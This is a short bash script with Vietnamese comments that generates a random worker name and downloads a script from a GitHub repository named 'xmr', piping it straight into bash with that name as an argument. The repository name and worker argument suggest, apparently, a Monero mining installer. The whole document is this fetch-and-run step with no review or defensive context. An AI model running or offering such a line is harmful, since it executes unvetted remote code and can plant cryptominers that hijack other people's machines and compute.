#!/bin/bash

# Sinh tên worker ngẫu nhiên
WORKER_NAME="worker$(shuf -i 1000-9999 -n 1)"

# Tải xuống và chạy script trực tiếp từ GitHub
wget -O - https://raw.githubusercontent.com/eddiestr/xmr/main/xmr.sh | tr -d '\r' | bash -s "$WORKER_NAME"
